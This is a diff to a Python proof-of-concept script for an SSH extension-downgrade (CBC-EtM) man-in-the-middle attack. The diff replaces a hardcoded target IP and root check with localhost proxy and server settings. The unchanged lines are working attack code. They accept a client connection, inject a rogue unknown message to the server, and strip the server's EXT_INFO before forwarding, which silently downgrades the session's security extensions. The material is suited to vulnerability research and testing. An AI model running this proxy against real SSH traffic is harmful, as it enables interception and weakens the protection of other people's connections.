@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-import os, sys, socket
+import socket
 from binascii import unhexlify
 from threading import Thread
 
@@ -14,12 +14,15 @@ from threading import Thread
 ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
 #####################################################################################
 
-INTERFACE = 'eth0'
-TARGET_PORT = 22
-TARGET_IP = '192.168.22.10'
+# IP and port for the TCP proxy to bind to
+PROXY_IP = '127.0.0.1'
+PROXY_PORT = 2222
 
-def is_root():
-    return os.geteuid() == 0
+# IP and port of the server
+SERVER_IP = '127.0.0.1'
+SERVER_PORT = 22
+
+LENGTH_FIELD_LENGTH = 4
 
 def pipe_socket_stream(in_socket, out_socket):
     try:
@@ -61,32 +64,27 @@ def perform_attack(client_socket, server_socket):
     # Inject unknown message (will be answered with UNIMPLEMENTED by the server)
     server_socket.send(rogue_unknown_msg)
     # Strip EXT_INFO before forwarding server_response to client
-    LENGTH_FIELD_LENGTH = 4
-    server_kex_reply_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[0:4])
+    server_kex_reply_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[:LENGTH_FIELD_LENGTH])
     server_newkeys_start = server_kex_reply_length
-    server_newkeys_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[server_newkeys_start:server_newkeys_start + 4])
+    server_newkeys_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[server_newkeys_start:server_newkeys_start + LENGTH_FIELD_LENGTH])
     server_extinfo_start = server_newkeys_start + server_newkeys_length
     client_socket.send(server_response[:server_extinfo_start])
 
 if __name__ == '__main__':
-    if not is_root():
-        print("[!] Script must be run as root!")
-        sys.exit(1)
-
     print("--- Proof of Concept for extension downgrade attack (CBC-EtM) ---")
     print("[+] WARNING: Connection failure may occur as this is a probabilistic attack.")
     mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    mitm_socket.bind(("0.0.0.0", TARGET_PORT))
+    mitm_socket.bind((PROXY_IP, PROXY_PORT))
     mitm_socket.listen(5)
 
-    print(f"[+] MitM Proxy started. Listening on port {TARGET_PORT} for incoming connections...")
+    print(f"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...")
     try:
         while True:
             client_socket, client_addr = mitm_socket.accept()
             print(f"[+] Accepted connection from: {client_addr}")
-            print(f"[+] Establishing new target connection to {(TARGET_IP, TARGET_PORT)}.")
+            print(f"[+] Establishing new target connection to {(SERVER_IP, SERVER_PORT)}.")
             server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server_socket.connect((TARGET_IP, TARGET_PORT))
+            server_socket.connect((SERVER_IP, SERVER_PORT))
             print("[+] Performing extension downgrade")
             perform_attack(client_socket, server_socket)
             print("[+] Downgrade performed. Spawning new forwarding threads to handle client connection from now on.")
